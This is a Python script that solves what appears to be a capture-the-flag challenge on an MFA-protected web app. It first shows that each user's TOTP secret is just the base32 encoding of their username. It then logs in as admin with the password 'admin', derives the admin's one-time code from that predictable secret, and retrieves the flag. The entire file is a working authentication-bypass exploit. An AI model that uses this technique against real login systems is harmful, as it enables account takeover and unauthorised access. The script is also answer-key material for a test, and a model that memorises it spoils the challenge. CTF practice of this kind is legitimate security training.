import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import random
import string
from bs4 import BeautifulSoup
import base64
import pyotp

BASE_URL = "https://mfa.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def generate_random_string(self, length = 60):
        return ''.join(random.choices(string.ascii_letters, k=length))

    def prove_secret_is_base32_username(self):
        creds = self.generate_random_string()
        response = self.session.post(f"{BASE_URL}/register", data={"username": creds, "password": creds})

        qr_url = BeautifulSoup(response.text, "html.parser").find("img")["src"]
        secret = qr_url.split("secret=")[-1]

        username_encoded = base64.b32encode(creds.encode()).decode()
        assert username_encoded == secret

    def main(self):
        self.prove_secret_is_base32_username()

        ADMIN = "admin"
        response = self.session.post(f"{BASE_URL}/login", data={"username": ADMIN, "password": ADMIN})

        admin_secret = base64.b32encode(ADMIN.encode()).decode()
        admin_totp = pyotp.TOTP(admin_secret).now()

        response = self.session.post(f"{BASE_URL}/mfa", data={"code": admin_totp})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()